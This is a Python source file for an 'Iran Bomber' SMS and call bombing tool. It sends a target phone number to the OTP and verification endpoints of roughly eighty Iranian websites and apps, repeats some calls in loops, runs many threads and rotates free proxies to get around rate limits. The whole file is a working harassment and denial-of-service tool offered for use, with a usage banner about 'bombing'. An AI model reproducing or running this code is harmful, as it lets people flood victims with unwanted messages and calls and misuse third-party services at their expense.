# import requests as req
from requests import post, get
from pystyle import *
from sys import argv, exit
from random import choice
from os import path
from threading import Thread

def snapp(phone, proxy):
    p = proxy or None
    try:
        r = post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json={"cellphone": phone}, headers={"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"},
            proxies=p)
    except: pass
    
def tapsi(phone, proxy):
    p = proxy or None
    try:
        post(url="https://tap33.me/api/v2/user", 
             json={"credential":{"phoneNumber":f'0{phone.split("+98")[1]}',"role":"PASSENGER"}},
             proxies=p)
    except: pass
    
def torob(phone, proxy):
    p = proxy or None
    try:
        get(url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{phone.split("+98")[1]}',
                headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},
                proxies=p)
    except: pass

def alibaba(phone, proxy):
    p = proxy or None
    try:
        post(url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
             json={"phoneNumber":f'0{phone.split("+98")[1]}'},
             proxies=p)
    except: pass

def snapmarket(phone, proxy):
    try:
        post(url="https://account.api.balad.ir/api/web/auth/login/",
             json={
                 "phone_number": f'0{phone.split("+98")[1]}',
                 "os_type": "W"
             },
             proxies=proxy)
    except: pass


def miare(phone, proxy):
    try:
        get(url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{phone.split("+98")[1]}',
            proxies=proxy)
    except: pass

def ostadkar(phone, proxy):
    try:    
        post(url="https://api.ostadkr.com/login",
             json={"mobile": f'0{phone.split("+98")[1]}'},
             proxies=proxy)
    except: pass

def drnext(phone, proxy):
    try:    
        post(url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
             json={
                 "source": "besina",
                 "mobile": f'0{phone.split("+98")[1]}'
             }, 
             proxies=proxy)
    except: pass

def behtarino(phone, proxy):
    try:
        post(url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
             json={"phone": f'0{phone.split("+98")[1]}'},
             proxies=proxy)
    except: pass

def bit24(phone, proxy): 
    try:
        post(url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',
             json={"mobile": f'0{phone.split("+98")[1]}',
                   "contry_code": "98"},
                   proxies=proxy)
    except: pass

def drdr(phone, proxy):
    try:
        post(url="https://drdr.ir/api/v3/auth/login/mobile/init",
                 json={"mobile": phone.split("+98")[1]},
                 proxies=proxy)
    except: pass


def drto(phone, proxy):
    try:
        get("https://api.doctoreto.com/api/web/patient/v1/accounts/register",
                json={
                    "mobile": phone.split("+98")[1],
                    "captcha": "",
                    "country_id": 205
                },
                proxies=proxy)
    except: pass

def okala(phone, proxy):
    try:
        post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",
                 json={"mobile": f'0{phone.split("+98")[1]}',
                        "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False},
                 proxies=proxy)
    except: pass

def banimod(phone, proxy):
    try:
        post(url="https://mobapi.banimode.com/api/v2/auth/request",
                 json={"phone": f'0{phone.split("+98")[1]}' },
                 proxies=proxy)
    except: pass


def berozmarket(phone, proxy):
    try:
        post(url="https://api.beroozmart.com/api/pub/account/send-otp",
                 json={"mobile": f'0{phone.split("+98")[1]}', "sendViaSms": True, "email": "null", "sendViaEmail": False},
                 proxies=proxy)
    except: pass

def itoll(phone, proxy):
    try:
        post(url="https://app.itoll.com/api/v1/auth/login",
                 json={"mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def gap(phone, proxy):
    try:
        get(url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{phone.split("+98")[1]}', proxies=proxy)
    except: pass

def call(phone, proxy):
    try: 
        get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{phone.split("+98")[1]}',
                proxies=proxy)
        persian = get(f"https://api.codebazan.ir/adad/?text={phone.split('+98')[1]}").json()
        get('https://www.tezolmarket.com/Account/Login',
                f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
        get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{phone.split("+98")[1]}&type=IVR')
    except: pass


def pinket(phone, proxy):
    try: 
        post(url="https://pinket.com/api/cu/v2/phone-verification",
                 json={"phoneNumber": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def footbal(phone, proxy):
    try:
        post(url="https://football360.ir/api/auth/verify-phone/",
                 json={"phone_number": phone},
                 proxies=proxy)
    except: pass

def pinorest(phone, proxy):
    try:
        post(url="https://api.pinorest.com/frontend/auth/login/mobile",
                 json={"mobile": f'{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def mrbilit(phone, proxy):
    try:
        get(url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{phone.split("+98")[1]}&source=2&sendTokenIfNot=true', proxies=proxy)
    except: pass


def hm(phone, proxy):
    try:
        post(url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
                 json={"PhoneNumber":f'0{phone.split("+98")[1]}',"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"},
                 proxies=proxy)
    except: pass


def lendo(phone, proxy):
    try: 
        post(url="https://api.lendo.ir/api/customer/auth/send-otp",
                 json={ "mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def taghche(phone, proxy):
    try: 
        post(url="https://gw.taaghche.com/v4/site/auth/login",
                 json={"contact": f'0{phone.split("+98")[1]}', "forceOtp": False},
                 proxies=proxy)
    except: pass

def fidibo(phone, proxy):
    try: 
        post("https://fidibo.com/user/login-by-sms", 
                 f'mobile_number={phone.split("+")[1]}&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09',
                 proxies=proxy)
    except: pass

def khodro45(phone, proxy):
    try: 
        post(url="https://khodro45.com/api/v1/customers/otp/", 
                 json={"mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def pateh(phone, proxy):
    try: 
        post(url="https://api.pateh.com/api/v1/LoginOrRegister",
                 json={"mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def ketabchi(phone, proxy):
    try: 
        post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
                 json={"auth": {"phoneNumber": f'0{phone.split("+98")[1]}'}},
                 proxies=proxy)
    except: pass

def ec(phone, proxy):
    try: 
        post(url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
                 json={"mobileNo": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass


def bime(phone, proxy):
    try: 
        post(url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
                 json={"phoneNumber": f'0{phone.split("+98")[1]}', "isResend": False},
                 proxies=proxy)
    except: pass

def pindo(phone, proxy):
    try: 
        post(url="https://api.pindo.ir/v1/user/login-register/",
                 json={"phone": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def delino(phone, proxy):
    try: 
        post(url="https://www.delino.com/user/register",
                 json={ "mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def zoodex(phone, proxy):
    try: 
        post(url="https://admin.zoodex.ir/api/v1/login/check",
                 json={"mobile": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass


def kukala(phone, proxy):
    try: 
        post(url="https://api.kukala.ir/api/user/Otp", 
                 json={"phoneNumber": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass


def baskol(phone, proxy):
    try: 
        post(url="https://www.buskool.com/send_verification_code",
                 json={"phone": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def setex(phone, proxy):
    try: 
        post(url="https://3tex.io/api/1/users/validation/mobile",
                 json={"receptorPhone": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass


def deniizshop(phone, proxy):
    try: 
        post(url="https://deniizshop.com/api/v1/sessions/login_request",
                 json={"mobile_number": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def flightioo(phone, proxy):
    try: 
        post(url="https://flightio.com/bff/Authentication/CheckUserKey",
                 json={"userKey": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass



def abantether(phone, proxy):
    try:
        post(url="https://abantether.com/users/register/phone/send/",
                json={"phoneNumber": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def pooleno(phone, proxy):
    try:
        post(url="https://api.pooleno.ir/v1/auth/check-mobile",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def wide(phone, proxy):
    try: 
        post(url="https://agent.wide-app.ir/auth/token",
                 json={"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": f'0{phone.split("+98")[1]}'},
                 proxies=proxy)
    except: pass

def ilms(phone, proxy):
    try:
        post(url="https://messengerg2c4.iranlms.ir/",
                json={"se": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def classino(phone, proxy):
    try:
        post(url="https://nx.classino.com/otp/v1/api/login",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def snappfood(phone, proxy):
    try:
        post(url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
                json={"cellphone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def bitbarg(phone, proxy):
    try:
        post(url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
                json={"phone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass




def bahramshop(phone, proxy):
    try:
        post(url="https://api.bahramshop.ir/api/user/validate/username",
                json={"username": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def tak(phone, proxy):
    try:
        post(url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
                json={"mobile_phone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass



def chamedon(phone, proxy):
    try:
        post(url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def kilid(phone, proxy):
    try:
        post(url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def otaghak(phone, proxy):
    try:
        post(url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                json={"userName": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass



def shab(phone, proxy):
    try:
        post(url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def raybit(phone, proxy):
    try:
        post(url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass



# def pubisha(phone, proxy):
#     try: 
#         post(url="https://www.pubisha.com/login/checkCustomerActivation",
#                  headers=f'mobile=0{phone.split("+98")[1]}',
#                  proxies=proxy)
#     except: pass


def farvi(phone, proxy):
    try:
        post(url="https://farvi.shop/api/v1/sessions/login_request",
                json={"mobile_phone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def namava(phone, proxy):
    try:
        post(url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                json={"UserName": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def a4baz(phone, proxy):
    try:
        post(url="https://a4baz.com/api/web/login",
                json={"cellphone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def anar(phone, proxy):
    try:
        post(url="https://api.anargift.com/api/people/auth",
                json={"user": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def nobat(phone, proxy):
    try:
        post(url="https://nobat.ir/api/public/patient/login/phone",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def ayantech(phone, proxy):
    try: 
        post(url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                 json={"Parametrs": {"ApplicationType": "Web","ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0","MobileNumber": f'0{phone.split("+98")[1]}' }},
                 proxies=proxy)
    except: pass

def simkhan(phone, proxy):
    try:
        post(url="https://www.simkhanapi.ir/api/users/registerV2",
                json={"mobileNumber": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def sibirani(phone, proxy):
    try:
        post(url="https://sandbox.sibirani.ir/api/v1/user/invite",
                json={"username": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def hiprejan(phone, proxy):
    try:
        post(url="https://shop.hyperjan.ir/api/users/manage",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def digikala(phone, proxy):
    try:
        post(url="https://api.digikala.com/v1/user/authenticate/",
                json={"username": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def hiword(phone, proxy):
    try:
        post(url="https://hiword.ir/wp-json/otp-login/v1/login",
                json={"identifier": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def tikban(phone, proxy):
    try:
        post(url="https://tikban.com/Account/LoginAndRegister",
                json={"cellPhone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def dicardo(phone, proxy):
    try:
        post(url="https://dicardo.com/main/sendsms",
                json={"phone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def digistyle(phone, proxy):
    try:
        post(url="https://www.digistyle.com/users/login-register/",
                json={"loginRegister[email_phone]": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def banan(phone, proxy):
    try:
        post(url="https://banankala.com/home/login",
                json={"Mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def offdecor(phone, proxy):
    try:
        post(url="https://www.offdecor.com/index.php?route=account/login/sendCode",
                json={"phone": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def exo(phone, proxy):
    try:
        post(url="https://exo.ir/index.php?route=account/mobile_login",
                json={"mobile_number": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def shahre_farsh(phone, proxy):
    try:
        post(url="https://shahrfarsh.com/Account/Login",
                json={"phoneNumber": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def takfarsh(phone, proxy):
    try:
        post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
                json={"phone_email": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def beheshti_carpet(phone, proxy):
    try:
        post(url="https://shop.beheshticarpet.com/my-account/",
                json={"billing_mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def khanomi(phone, proxy):
    try:
        post(url="https://www.khanoumi.com/accounts/sendotp",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def rojashop(phone, proxy):
    try:
        post(url="https://rojashop.com/api/auth/sendOtp",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def dadpardaz(phone, proxy):
    try:
        post(url="https://dadpardaz.com/advice/getLoginConfirmationCode",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def rokla(phone, proxy):
    try:
        post(url="https://api.rokla.ir/api/request/otp",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def kh45(phone, proxy):
    try:
        post(url="https://khodro45.com/api/v1/customers/otp/",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def mb(phone, proxy):
    try:
        post(url="https://api.pezeshket.com/core/v1/auth/requestCode",
                json={"mobileNumber": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def virgool(phone, proxy):
    try:
        post(url="https://virgool.io/api/v1.4/auth/verify",
                json={"method": "phone", "identifier": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass


def timche(phone, proxy):
    try:
        post(url="https://api.timcheh.com/auth/otp/send",
                json={"mobile": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass

def paklean(phone, proxy):
    try:
        post(url="https://client.api.paklean.com/user/resendCode",
                json={"username": f'0{phone.split("+98")[1]}'},
                proxies=proxy)

    except: pass
def daal(phone, proxy):
    try:
        post(url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request"
     ,headers={ "Accept": "application/json",
               },
               json={ "phone": f"0{phone.split('+98')[1]}"},
               proxies= proxy)
    except: 
        pass

def bime2(phone, proxy):
    try:
        post(url="https://bimebazar.com/accounts/api/login_sec/",
            json={ "username": f"0{phone.split('+98')[1]}"},
            proxies=proxy)
    except: pass

def azki(phone, proxy):
    try:
        post(url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",
             json={"phoneNumber": f"0{phone.split('+98')[1]}"},
             proxies=proxy)
    except: pass

def bimito(phone, proxy):
    try:
        post(url="https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/",
            json={"phoneNumber": f"0{phone.split('+98')[1]}"},
                proxies=proxy)
    except: pass

def safarMarket(phone, proxy):
    try: 
        post(url="https://safarmarket.com//api/security/v2/user/otp",
             json={"phone": f"0{phone.split('+98')[1]}"},
             proxies=proxy)
    except: pass




g = Col.green
pu = Col.purple
pi = Col.pink
cy = Col.cyan
bl = Col.blue
random_color = lambda b: choice([g,pu,pi,cy,bl])
def main(phonenum: str, proxy):
    pr = { "http": proxy, "https": proxy} if proxy else None
    snapp(phonenum, pr)
    torob(phonenum, pr)
    tapsi(phonenum, pr)
    alibaba(phonenum, pr)
    snapmarket(phonenum, pr)
    miare(phonenum, pr)
    ostadkar(phonenum, pr)
    drnext(phonenum, pr)
    behtarino(phonenum, pr)
    bit24(phonenum, pr)
    drdr(phonenum, pr)
    okala(phonenum, pr)
    berozmarket(phonenum, pr)
    banimod(phonenum, pr)
    gap(phonenum, pr)
    itoll(phonenum, pr)
    pinket(phonenum, pr)
    footbal(phonenum, pr)
    mrbilit(phonenum, pr)
    pinorest(phonenum, pr)
    hm(phonenum, pr)
    lendo(phonenum, pr)
    taghche(phonenum, pr)
    fidibo(phonenum, pr)
    khodro45(phonenum, pr)
    for i in range(20):
        pateh(phonenum, pr)
    ketabchi(phonenum, pr)
    ec(phonenum, pr)
    bime(phonenum, pr)
    pindo(phonenum, pr)
    delino(phonenum, pr)
    zoodex(phonenum, pr)
    setex(phonenum, pr)
    deniizshop(phonenum, pr)
    flightioo(phonenum, pr)
    abantether(phonenum, pr)
    pooleno(phonenum, pr)
    wide(phonenum, pr)
    ilms(phonenum, pr)
    classino(phonenum, pr)
    snappfood(phonenum, pr)
    bitbarg(phonenum, pr)
    bahramshop(phonenum, pr)
    tak(phonenum, pr)
    chamedon(phonenum, pr)
    kilid(phonenum, pr)
    otaghak(phonenum, pr)
    shab(phonenum, pr)
    raybit(phonenum, pr)
    farvi(phonenum, pr)
    namava(phonenum, pr)
    a4baz(phonenum, pr)
    anar(phonenum, pr)
    nobat(phonenum, pr)
    ayantech(phonenum, pr)
    simkhan(phonenum, pr)
    sibirani(phonenum, pr)
    hiprejan(phonenum, pr)
    digikala(phonenum, pr)
    hiword(phonenum, pr)
    tikban(phonenum, pr)
    dicardo(phonenum, pr)
    digistyle(phonenum, pr)
    banan(phonenum, pr)
    offdecor(phonenum, pr)
    exo(phonenum, pr)
    shahre_farsh(phonenum, pr)
    takfarsh(phonenum, pr)
    beheshti_carpet(phonenum, pr)
    khanomi(phonenum, pr)
    rojashop(phonenum, pr)
    dadpardaz(phonenum, pr)
    rokla(phonenum, pr)
    kh45(phonenum, pr)
    mb(phonenum, pr)
    virgool(phonenum, pr)
    timche(phonenum, pr)
    paklean(phonenum, pr)
    daal(phonenum, pr)
    bime2(phonenum, pr)
    azki(phonenum, pr)
    bimito(phonenum, pr)
    safarMarket(phonenum, pr)



banner = '''



          ██╗██████╗  █████╗ ███╗  ██╗
          ██║██╔══██╗██╔══██╗████╗ ██║
          ██║██████╔╝███████║██╔██╗██║
          ██║██╔══██╗██╔══██║██║╚████║
          ██║██║  ██║██║  ██║██║ ╚███║
          ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝

██████╗  █████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╦╝██║  ██║██╔████╔██║██████╦╝█████╗  ██████╔╝
██╔══██╗██║  ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╦╝╚█████╔╝██║ ╚═╝ ██║██████╦╝███████╗██║  ██║
╚═════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
'''

logo = Colorate.Horizontal(Colors.DynamicMIX((Col.cyan, Col.blue, Col.purple)), Center.XCenter(banner))

# print(logo)
def err():
    print()
    System.Clear()
    print('''
        {2}Usage = {1}python bomber.py +989123456789{2}
        proxy = {1}--proxy{2}
        threads = {1}--threads {4}<amount>{2}
           {4}>>{3} python bomber.py {1}--proxies --threads 7
             {4}>>>{5} This will start bombing with proxies and 7 Threads 
        {0}
          Tip: 
               You can use {4}<{0} python bumber.py --scrapp {4}>{0} to
               get Fresh proxies! 
                   
'''.format(Col.cyan, Col.green, Col.light_gray, Col.light_blue, Col.pink, Col.light_red))
    print(Col.reset) 
    exit()

def info_table(threads, number, proxies):
    if path.exists("proxies.txt"):
        with open("proxies.txt", 'r') as file:
            count = len(file.readlines())
    else:
        count = 0
    
    def bruh():
        return f"{Col.orange}| {Col.cyan}{count} " if proxies == True else "    "
    text = '''
    
                                        {5}Started the Job with {0}{6}{5} thread(s)                   
                                                                
                                        {2}Phone Number {3}={0} {7}                          
                                                                
                                        {4}Proxies:                                           
                                            {3}>>> {2}State{4}: {0}{8} {9}                        


                {11}       
'''.format(Col.green, Col.cyan, Col.purple, Col.dark_blue, Col.orange, Col.red, threads, number, proxies, bruh(), Col.yellow, Colors.reset)
    return text

def random_proxy():
    with open('proxies.txt', 'r') as file:
        p = file.readlines()

        return choice(p).strip() if len(p) > 0 else None
if not len(argv) > 1:
    err()
    # print(Col.reset)
else:
    num = argv[1]
    args = ' '.join(argv).lower().split('--') if '--' in ' '.join(argv) else False

    if num.startswith("+98") and len(num) == 13:
        System.Clear()
        print(logo)
        def return_num(txt):
            lst = [str(i) for i in range(10)]
            nums = []
            for i in txt:
                if i in lst:
                    nums.append(i)
            else:
                return ''.join(nums)
        if args:
            threads = return_num(''.join(args).split('threads')[1]) if not 'threads' in args else 1
            if 'proxies' in ' '.join(args):
                System.Title(f"Threads: {threads} , Proxies: True, Number: {num}")
                for i in range(int(threads)):
                    Thread(target=main, args= (num, random_proxy()), name=str(i)).start()
                else: print(Center.XCenter(info_table(threads=threads, proxies=True, number=num)))
                    
                # else: 
                #     end()
            elif not 'proxies' in ''.join(args):
                System.Title(f"Threads: {threads} , Proxies: False, Number: {num}")
                for i in range(int(threads)):
                    Thread(target=main, args=(num, None), name=str(i)).start()
                else: 
                    print(info_table(threads=threads, proxies=False, number=num))
        else:
            System.Title(f"Threads: 1 , Proxies: False, Number: {num}") 
            main(num, None)
            print(info_table(threads=1, proxies=False, number=num))
    else:
        if args:
            if "scrapp" in args:
                with open("proxies.txt", "w") as file:
                    System.Clear()
                    print(logo)
                    print('\n')
                    p = get("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt").text
                    file.write(p)
                    Write.Print(text="   Your 'proxies.txt' has been updated, Enjoy!", color=Colors.red_to_yellow, interval=0.000)

            else: 
                err()
        else:
            err()